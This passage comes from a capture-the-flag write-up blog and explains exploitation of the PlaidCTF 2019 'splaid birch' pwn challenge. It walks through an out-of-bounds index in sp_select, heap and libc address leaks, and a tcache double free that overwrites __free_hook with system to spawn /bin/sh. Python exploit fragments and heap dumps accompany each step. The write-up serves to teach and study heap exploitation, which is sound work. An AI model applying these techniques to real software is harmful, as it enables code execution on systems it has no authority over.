</pre></table></code></div></div><p>By controlling the <code class="highlighter-rouge">node_idx</code> parameter (which we do) we can perform an <code class="highlighter-rouge">sp_select</code> on any “node” on the heap, since there is <strong>no bounds check</strong>. The <code class="highlighter-rouge">sp_select</code> function looks like this:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cm">/* libsplaid.so.1 */</span>
<span class="n">sp_node</span> <span class="nf">sp_select</span><span class="p">(</span><span class="n">sp_tree</span> <span class="o">*</span><span class="n">tree</span><span class="p">,</span> <span class="n">sp_node</span> <span class="o">*</span><span class="n">node_to_select</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">sp_node</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>

  <span class="n">result</span> <span class="o">=</span> <span class="n">splay</span><span class="p">(</span><span class="n">node_to_select</span><span class="p">,</span> <span class="n">tree</span><span class="o">-&gt;</span><span class="n">func_2</span><span class="p">);</span>
  <span class="n">tree</span><span class="o">-&gt;</span><span class="n">root_node</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><p>We have to ensure a couple of things to guarantee the program doesn’t crash during the <strong>splay</strong>:</p><ol><li><code class="highlighter-rouge">node_to_select</code> is a valid pointer to a node (or null)</li><li><code class="highlighter-rouge">node_to_select-&gt;parent</code>, <code class="highlighter-rouge">node_to_select-&gt;left</code>, <code class="highlighter-rouge">node_to_select-&gt;right</code> are all null or another valid node</li></ol><h2 id="exploit">Exploit</h2><h3 id="heap-leak">Heap Leak</h3><p>To defeat ASLR we need to leak some addresses. The first leak we need is a heap address. This will allow us to have more control over the fake node we are selecting. We achieve this with the Out-Of-Bounds Read (<strong>OOBR</strong>) we found before.</p><p>After a bit of experimentation, we were able to setup the heap to have this <strong>fake node</strong> we can index to (and doesn’t crash on splay):</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>tree-&gt;nodes[node_idx]
    |
    v
0x555555758858: 0x0000000000000000  --&gt; node-&gt;node_val
0x555555758860: 0x0000555555758718  --&gt; node-&gt;node_val_2 (will be printed)
0x555555758868: 0x0000000000000000  --&gt; node-&gt;unk_4
0x555555758870: 0x0000000000000006  --&gt; node-&gt;unk_1
0x555555758878: 0x000000000001f791  --&gt; node-&gt;node_i
0x555555758880: 0x0000000000000000  --&gt; node-&gt;parent
0x555555758888: 0x0000000000000000  --&gt; node-&gt;left
0x555555758890: 0x0000000000000000  --&gt; node-&gt;right
0x555555758898: 0x0000000000000000  --&gt; node-&gt;sz
</pre></table></code></div></div><p>As we have seen before <code class="highlighter-rouge">node-&gt;node_val_2</code> is printed, allowing us to leak an heap address and <strong>de-randomize the heap</strong>.</p><p>This is the code we wrote to accomplish it:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>    <span class="c1"># ==========
</span>    <span class="c1"># Leak heap ptr
</span>    <span class="c1"># ==========
</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leaking a heap addr:"</span><span class="p">)</span>

    <span class="c1"># This values were found by trial and error
</span>    <span class="n">N</span> <span class="o">=</span> <span class="mi">16</span>
    <span class="n">del_N</span> <span class="o">=</span> <span class="mi">10</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">27</span>

    <span class="c1"># Create and delete nodes to setup the heap for our leak
</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
        <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">del_N</span><span class="p">):</span>
        <span class="n">del_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>

    <span class="c1"># `select_node` is vulnerable to an OOBR
</span>    <span class="c1"># By selecting a fake 'node' in the heap, we get a heap pointer leak
</span>    <span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">select_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">idx</span><span class="p">))</span>
</pre></table></code></div></div><h3 id="libc-leak">Libc Leak</h3><p>Now that we know the address of the <strong>heap</strong>, we can place our own addresses of fake nodes instead of relying on the ones already there on the heap.</p><p>To start we just <strong>reset the tree</strong> to avoid crashing on further operations from having added an invalid node for the leak. We do it with <code class="highlighter-rouge">select_node(s, del_N + 1)</code>, which simply selects one of the valid nodes we had inserted before. The <code class="highlighter-rouge">sp_select</code> function does <code class="highlighter-rouge">tree-&gt;root_node = result</code> and so we just go back to the original (not corrupted) state.</p><p>Before leaking a libc address we also need to make one show up on the heap. To do this we’ll trigger a <strong>realloc</strong> in the <code class="highlighter-rouge">op_5_add_node</code> function, which, since there is no continuous space available, will <strong>free</strong> <code class="highlighter-rouge">tree-&gt;nodes</code> and copy the data to a <strong>new malloc’ed area</strong>. The block being freed is large and therefore does not go on the tcache or fastbins, but is instead placed in the <strong>unsorted chunk list</strong>, which is a doubly linked list. As a comment in <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4360">glibc’s source code</a> mentions:</p><blockquote><p>“Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.”</p></blockquote><p>Being the only <em>chunk</em> in the list at this moment, both the <strong>forward</strong> and <strong>back</strong> pointers, now point to the <code class="highlighter-rouge">main_arena</code> which is the structure in <strong>libc</strong> that holds these lists of free <em>chunks</em>.</p><p>Having this address on the heap we can now leak it. We spray the heap with an address so that <code class="highlighter-rouge">node-&gt;node_val_2</code> points to the libc address and then index into it with <code class="highlighter-rouge">op_4_select</code> as we did before.</p><p>The last thing we need to make sure is that <strong>the realloc’ed chunk is placed before the old free chunk</strong> so we can use positive indexes in <code class="highlighter-rouge">op_4_select</code>. To do this we delete all the nodes we inserted except the last few ones to prevent the realloc from extending the old chunk. This way the new chunk is placed before the old chunk. <em>(afterwards we realized we could use negative indexes as well, so this step was unecessary)</em></p><p>This is the code we wrote to accomplish it:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>    <span class="c1"># ==========
</span>    <span class="c1"># Leak libc addr
</span>    <span class="c1"># ==========
</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leaking a libc addr:"</span><span class="p">)</span>

    <span class="c1"># Create nodes just before a call to `realloc` for the `tree-&gt;nodes`
</span>    <span class="c1"># Put the addr where our libc leak will be in the node so we can then index into it
</span>    <span class="n">leak_libc_addr</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mi">720</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">305</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">arg2</span><span class="o">=</span><span class="n">leak_libc_addr</span><span class="p">)</span>

    <span class="c1"># Delete most nodes inserted to get space for the next `realloc`
</span>    <span class="c1"># We need this to ensure the realloc comes above the alocated nodes so we can index into it
</span>    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">j</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">del_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>

    <span class="c1"># Trigger the `realloc`
</span>    <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">arg2</span><span class="o">=</span><span class="n">leak_libc_addr</span><span class="p">)</span>

    <span class="n">leak_libc_idx</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0xb48</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">leak_libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">select_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">leak_libc_idx</span><span class="p">))</span>
</pre></table></code></div></div><h3 id="exploiting-the-tcache">Exploiting the Tcache</h3><p>Ok, we have all these leaks, but how do we get code execution? Our goal was to overwrite the <code class="highlighter-rouge">__free_hook</code> function pointer located in the libc, which, if not null, is called whenever free is called.</p><p>If we can somehow make it point to <code class="highlighter-rouge">system</code>, we can then do the following:</p><ol><li>Add a node with value <code class="highlighter-rouge">"/bin/sh\x00"</code> (will be the root of the tree)</li><li>Add a node with value <code class="highlighter-rouge">"/bin/sh\x00"</code> (will fail and be freed)</li></ol><p>This last step will make <code class="highlighter-rouge">sp_add</code> fail, because no two nodes can have the same value. This causes a call to <code class="highlighter-rouge">free(node)</code> and since we overwrote the <code class="highlighter-rouge">__free_hook</code> pointer with <code class="highlighter-rouge">system</code>, it will also call <code class="highlighter-rouge">system("/bin/sh\x00")</code>.</p><p>So:</p><ol><li>We can create nodes of size 72 and control their <code class="highlighter-rouge">node-&gt;node_val</code> and <code class="highlighter-rouge">node-&gt;node_val_2</code></li><li>We can delete (free) nodes which will end up on the <a href="http://tukan.farm/2017/07/08/tcache/">tcache</a>. The pointer to the <code class="highlighter-rouge">next</code> free chunk in the <strong>tcache_entry</strong> will be exactly in the same offset as our <code class="highlighter-rouge">node-&gt;node_val</code> field.</li></ol><p>By exploiting the OOBR again we can cause a double free of a node by:</p><ul><li>creating a node</li><li>deleting it</li><li>selecting it (with our OOBR), making it part of the tree again</li><li>deleting it the second time</li></ul><p>We use this to corrupt <code class="highlighter-rouge">tcache_entry-&gt;next</code> and make malloc return an arbitrary pointer (in our case to <code class="highlighter-rouge">__free_hook</code>) as shown in the image below and commented on the exploit code.</p><hr /><p><img class="lozad" src=/assets/img/commons/loading.png data-src="/assets/img/splaid_birch/tcache_corruption.png" alt="upload-image" /></p><hr /><p>This is the code we wrote to accomplish it:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>    <span class="n">m1_addr</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mi">14800</span>
    <span class="n">idx_for_m1_addr</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x16e0</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">idx_for_nulls</span> <span class="o">=</span> <span class="n">idx_for_m1_addr</span> <span class="o">+</span> <span class="mi">1</span>

    <span class="c1"># This node is used to keep the pointer to m1 and a pointer to a 'null' node (aka no parent, left or right)
</span>    <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">m1_addr</span><span class="p">,</span> <span class="n">pointer_to_nulls</span><span class="p">)</span>

    <span class="c1"># Create m1, the node we will want to free twice
</span>    <span class="n">m1</span> <span class="o">=</span> <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

    <span class="c1"># Free m1, the first time
</span>    <span class="n">del_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">m1</span><span class="p">)</span>

    <span class="c1"># Select m1's addr and free it again
</span>    <span class="n">select_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">idx_for_m1_addr</span><span class="p">)</span>
    <span class="n">del_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># m2 will get the same addr as m1.
</span>    <span class="c1"># Corrupt: m1-&gt;next == `__free_hook`
</span>    <span class="n">m2</span> <span class="o">=</span> <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">free_hook</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="n">select_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">idx_for_nulls</span><span class="p">)</span>
    <span class="n">m3</span> <span class="o">=</span> <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

    <span class="c1"># m4 will get the addr of `__free_hook`. Write `system` there!
</span>    <span class="n">m4</span> <span class="o">=</span> <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># Creats a node pointing to "/bin/sh\x00"
</span>    <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">u64</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># Adding a second node with the same val will fail and result in `free(node_2)`
</span>    <span class="c1"># We made `__free_hook` point to system and so we get `system("/bin/sh\x00")`
</span>    <span class="n">create_node</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">u64</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div><hr /><p>Running the exploit:</p><p><img class="lozad" src=/assets/img/commons/loading.png data-src="/assets/img/splaid_birch/final_scrn.png" alt="upload-image" /></p></div><div class="post-tail text-muted"><div class="mb-4"> <a href="/tags/plaid2019/" class="post-tag no-text-decoration" >plaid2019</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down"><div class="access"><div id="access-lastmod" class="post mb-4"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/nullcon20_dark_honya/">Dark Honya -- nullcon HackIM 2020</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/pwn2win/">pwn2win</a> <a class="post-tag" href="/tags/plaid2019/">plaid2019</a> <a class="post-tag" href="/tags/nullcon20/">nullcon20</a> <a class="post-tag" href="/tags/interfaces/">interfaces</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/graphics/">graphics</a> <a class="post-tag" href="/tags/databases/">databases</a> <a class="post-tag" href="/tags/csaw18/">csaw18</a> <a class="post-tag" href="/tags/computer-networks/">computer networks</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Heap_Exploitation_Lecture/"><div class="card-body"> <span class="timeago small"> Dec 3, 2019 <i class="unloaded">2019-12-03T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Heap Exploitation Lecutre</h3><div class="text-muted small"><p>Lecture with Jorge on Glibc’s Heap basics and how to exploit it. We covered the following topics: Chunks and chunk implementation Coalescing Main arena and Bins Tcache Common attacks ...</p></div></div></a></div><div class="card"> <a href="/posts/CSAW18_shell-code/"><div class="card-body"> <span class="timeago small"> Sep 20, 2018 <i class="unloaded">2018-09-20T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>shell->code -- CSAW2018 Quals</h3><div class="text-muted small"><p>Points: 100 Solves: 261 Description: Linked lists are great! They let you chain pieces of data together. nc pwn.chal.csaw.io 9005 flag format: flag{...} Given: shellpointcode Introd...</p></div></div></a></div><div class="card"> <a href="/posts/Pwn2Win19_random_vault/"><div class="card-body"> <span class="timeago small"> Nov 10, 2019 <i class="unloaded">2019-11-10T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Random Vault -- Pwn2Win 2019 CTF</h3><div class="text-muted small"><p>With Jorge Points: 303 (dynamic) Solves: 18 TL;DR Only two Format String vulnerability allowed. Use first Format String to bypass PIE mitigation Use second Format String to: cha...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Artificial_inteligence_coursework/" class="btn btn-outline-primary"><p>Artificial Intelligence Course Project</p></a> <a href="/posts/Pwn2Win19_random_vault/" class="btn btn-outline-primary"><p>Random Vault -- Pwn2Win 2019 CTF</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="copyright"><p class="mb-0"> © 2019-2020<a href="https://twitter.com/bl4ck_pwn" class="ml-1">Pedro Bernardo</a>. <br>Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a>.</p></div><div class="license"><p class="mb-0"> The blog posts on this site are licensed under the <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/pwn2win/">pwn2win</a> <a class="post-tag" href="/tags/plaid2019/">plaid2019</a> <a class="post-tag" href="/tags/nullcon20/">nullcon20</a> <a class="post-tag" href="/tags/interfaces/">interfaces</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/graphics/">graphics</a> <a class="post-tag" href="/tags/databases/">databases</a> <a class="post-tag" href="/tags/csaw18/">csaw18</a> <a class="post-tag" href="/tags/computer-networks/">computer networks</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
